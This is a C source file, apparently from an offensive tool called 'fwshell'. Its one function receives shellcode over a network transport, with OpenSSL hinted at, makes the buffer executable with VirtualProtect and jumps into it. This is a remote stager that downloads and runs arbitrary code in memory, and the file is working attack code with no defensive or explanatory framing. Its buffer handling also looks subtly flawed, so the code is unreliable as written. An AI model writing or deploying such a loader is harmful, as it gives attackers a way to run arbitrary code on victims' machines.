#include "fwshell.h"

DWORD
ShellcodeReceiveExecute(PCTX_TRANSPORT_INFO lpTransportInfo)
{
    DWORD dwRet = 0;
    PBYTE lpBuffer = NULL;
    PBYTE lpBufferPtr = NULL;
    DWORD dwBufferSize = 0;
    DWORD dwBytesRead = 0;
    DWORD dwTotalSize = 0;
    DWORD dwShellcodeSize = 0;
    VOID(*pShellcode)() = NULL;

    dwBufferSize = lpTransportInfo->GetMaxBufferSize(lpTransportInfo);
    lpBuffer = MALLOC(dwBufferSize);
    if (lpBuffer == NULL)
        goto cleanup;

    dwTotalSize += dwBufferSize;
    lpBufferPtr = lpBuffer;

    /* Receive the shellcode. */
    while (1)
    {
        dwBytesRead = lpTransportInfo->Read(lpTransportInfo, lpBufferPtr, dwBufferSize);
        if (dwBytesRead == 0)
            break;

        dwShellcodeSize += dwBytesRead;
        if (dwShellcodeSize < dwBytesRead)
            goto cleanup;

        if (dwBytesRead == dwBufferSize)
        {
            dwTotalSize += dwBufferSize;
            if (dwTotalSize < dwBufferSize)
                goto cleanup;

            lpBuffer = REALLOC(lpBuffer, dwTotalSize);
            if (lpBuffer == NULL)
                goto cleanup;

            lpBufferPtr = lpBuffer + dwTotalSize - dwBufferSize;
        }

    }

    if (dwShellcodeSize == 0)
    {
        wprintf(L"[-] Did not receive the shellcode: OpenSSL problem?\n");
        goto cleanup;
    }

    if (VirtualProtect(lpBuffer, dwShellcodeSize, PAGE_EXECUTE, &dwTotalSize) == 0)
    {
        wprintf(L"[-] VirtualProtect() failed: %d.\n", GetLastError());
        goto cleanup;
    }

    wprintf(L"[+] Executing shellcode: %d (0x%x) bytes.\n", dwShellcodeSize, dwShellcodeSize);
    ((void(*)())lpBuffer)();

    dwRet = 1;
cleanup:
    if (lpBuffer != NULL)
        FREE(lpBuffer);

    lpTransportInfo->Disconnect(lpTransportInfo);

    return dwRet;
}